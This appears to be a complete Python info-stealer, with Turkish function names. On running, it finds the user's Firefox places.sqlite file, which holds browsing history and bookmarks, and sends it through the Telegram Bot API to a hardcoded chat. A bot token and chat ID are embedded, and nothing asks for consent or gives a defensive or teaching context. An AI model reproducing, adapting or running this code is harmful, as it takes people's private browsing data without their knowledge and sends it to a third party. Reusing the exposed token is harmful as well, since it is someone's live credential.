import requests 
import subprocess
import os

TOKEN = "7012404778:AAHqzFHEmAq2egqfiNwnRs0XQXJ9M4BOa9c"
chat_id = "2099296970"

def tarayıcıdata():
    
    home_directory = os.path.expanduser("~")
    
    
    dosyakonumu = subprocess.run(["find", f"{home_directory}/.mozilla/firefox", "-name", "places.sqlite"], stdout=subprocess.PIPE, text=True)
    dosyakonumu_str = dosyakonumu.stdout.strip()
    
    
    file_path = dosyakonumu_str
    
    
    api = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, "rb") as file:
        files = {"document": file}
        response = requests.post(api, data={"chat_id": chat_id}, files=files)


tarayıcıdata()
